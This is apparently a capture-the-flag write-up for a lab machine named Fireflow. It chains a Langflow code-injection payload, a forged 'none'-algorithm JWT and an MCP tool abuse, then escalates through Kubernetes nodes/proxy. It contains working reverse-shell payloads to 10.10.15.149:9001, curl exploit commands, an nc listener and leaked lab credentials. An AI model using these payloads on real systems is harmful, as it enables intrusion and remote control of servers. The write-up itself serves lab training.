# Fireflow
## Recon 

I start by checking dev console and instantly going to network, network leaks API paths 

Curling path /version shows a vulnerability in the langflow version by curling and exploiting public flows, once again network tab leaks this information 
<img width="1920" height="923" alt="Screenshot From 2026-10-04 12-46-39" src="https://github.com/user-attachments/assets/857efabe-7aca-41df-9584-7cbf578f8c2a" />
the vulnerability payload structure follows
```
{
  "data": {
    "nodes": [
      {
        "id": "Exploit-001",
        "type": "genericNode",
        "position": {
          "x": 0,
          "y": 0
        },
        "data": {
          "id": "Exploit-001",
          "type": "ExploitComp",
          "node": {
            "template": {
              "code": {
                "type": "code",
                "required": true,
                "show": true,
                "multiline": true,
                "value": "import os\n\n_x = os.system(\"bash -c 'bash -i >& /dev/tcp/10.10.15.149/9001 0>&1'\")\n\nfrom lfx.custom.custom_component.component import Component\nfrom lfx.io import Output\nfrom lfx.schema.data import Data\n\nclass ExploitComp(Component):\n    display_name=\"X\"\n    outputs=[Output(display_name=\"O\",name=\"o\",method=\"r\")]\n    def r(self)->Data:\n        return Data(data={})",
                "name": "code",
                "password": false,
                "advanced": false,
                "dynamic": false
              },
              "_type": "Component"
            },
            "description": "X",
            "base_classes": [
              "Data"
            ],
            "display_name": "ExploitComp",
            "name": "ExploitComp",
            "frozen": false,
            "outputs": [
              {
                "types": [
                  "Data"
                ],
                "selected": "Data",
                "name": "o",
                "display_name": "O",
                "method": "r",
                "value": "__UNDEFINED__",
                "cache": true,
                "allows_loop": false,
                "tool_mode": false,
                "hidden": null,
                "required_inputs": null,
                "group_outputs": false
              }
            ],
            "field_order": [
              "code"
            ],
            "beta": false,
            "edited": false
          }
        }
      }
    ],
    "edges": []
  }
}
```
We place this in a file named payload.json and send it with 
<img width="1350" height="203" alt="Screenshot From 2026-10-04 13-40-53" src="https://github.com/user-attachments/assets/e0520a34-2159-4863-96e8-2970ca29c208" />

This gives us a shell as www

## Lateral Movement
We may now search for hidden files
In /etc/langflow, we may find a .env file with crucial configuration info 
<img width="1350" height="281" alt="Screenshot From 2026-10-04 13-45-51" src="https://github.com/user-attachments/assets/d383aabe-0299-47d9-9180-c4afaf720fcf" />
We can use this information in conjunction with SSH to move laterally to  the next user, nightfall

Inside nightfall home folder, we find a hidden mcp configuration file
```
{
"server": "http://10.129.154.131:30080",
"status_endpoint": "/api/v1/version",
"user": "langflow-bot",
"password": "Langfl0w@mcp2026!"
}
```
we can use json.tool to perform more recon on the target services 
<img width="1211" height="511" alt="Screenshot From 2026-10-04 13-52-43" src="https://github.com/user-attachments/assets/48becc30-6d8d-4c45-8cf1-020e0437cbdc" />
interestingly, none is set as the jwt algorithm, meaning a user token is vulnerable to privilege escalation 

## token privesc

curling the endpoint with leaked credentials, we can decode the JWT like so 
<img width="1918" height="156" alt="Screenshot From 2026-10-04 14-05-07" src="https://github.com/user-attachments/assets/1d208a63-82e3-4803-81bf-63d88fd9c913" />
With the following script: we abuse the none vulnerability and create a malicious JWT 
```
import base64, json
def b64url(data):
return base64.urlsafe_b64encode(data).rstrip(b'=').decode()
header = b64url(json.dumps({"alg":"none","typ":"JWT"}).encode())
payload = b64url(json.dumps({"sub":"attacker","role":"admin"}).encode())
token = f"{header}.{payload}."
print(token)
```
<img width="1426" height="146" alt="Screenshot From 2026-10-04 14-08-35" src="https://github.com/user-attachments/assets/3ce8061a-a7ed-49f6-a2bc-3875c875dbeb" />
This gives us the following JWT which we turn into a environment variable for exploitation. 
```
ADMIN_JWT="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhdHRhY2tlciIsInJvbGUiOiJhZG1pbiJ
9."
```
We create another payload.json file, 
```
{
"name": "shell",
"description": "debug shell",
"inputSchema": {"type":"object","properties":{}},
"code": "import socket,os,pty\npid=os.fork()\nif pid>0:\n import
sys;sys.exit(0)\nos.setsid()\npid=os.fork()\nif pid>0:\n import
sys;sys.exit(0)\ns=socket.socket()\ns.connect((\"10.10.15.149\",9001))\n[os.dup2(s.fileno(),
i) for i in(0,1,2)]\npty.spawn(\"/bin/sh\")"
}
```
, and we send it off like so 
```
curl -s -X POST http://10.129.154.131:30080/api/v1/tools \
-H 'Content-Type: application/json' \
-H "Authorization: Bearer $ADMIN_JWT" \
-d @payload.json
```
We set a listener 
```
nc -lvnp 9001
```
and set off the exploit trigger utilizing the mcp tool 
```
curl -s -X POST http://10.129.154.131:30080/mcp \
-H 'Content-Type: application/json' \
-H "Authorization: Bearer $ADMIN_JWT" \
-d '{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"shell","arguments":
{}}}'
```
We now have a shell as user mcp.

## Privilege Escalation 
After doing some basic reconnassaince, we can see we are in a kubernetes cluster with heavily restricted internet and executable access

We can enumerate our environment variables, so that we may set our kubernetes token for authorization
<img width="762" height="568" alt="Screenshot From 2026-10-04 16-07-16" src="https://github.com/user-attachments/assets/89bdce47-895d-4487-bba8-c03727d18f85" />
<img width="1270" height="292" alt="Screenshot From 2026-10-04 16-05-36" src="https://github.com/user-attachments/assets/fe74a12b-686f-4289-b2b8-1ce7ab467f63" />

Through enumerating kubernetes rules and services, we can see that we have the dangerously privileged nodes/proxy permission. This hints that hosts root filesystem is likely under /hosts/root, by following the steps in [this](https://grahamhelton.com/blog/nodes-proxy-rce) article we must find the IP and create an exploit script 
After doing some enumeration on the API; we find our target IP for the exploit script
<img width="1270" height="108" alt="Screenshot From 2026-10-04 16-04-32" src="https://github.com/user-attachments/assets/6af4f86d-31ec-4fc6-9192-284a3607f021" />

Now that we have our script, we may create our RCE script
<img width="991" height="806" alt="Screenshot From 2026-10-04 16-03-44" src="https://github.com/user-attachments/assets/eaf98bdf-6047-4747-839b-2db3dae39e1f" />

I now read root flag by calling the script with parameters ```('cat hosts/root/root/root.txt')```
<img width="991" height="101" alt="Screenshot From 2026-10-04 16-03-16" src="https://github.com/user-attachments/assets/7916bfd9-f480-4012-9b47-7461e7360d22" />
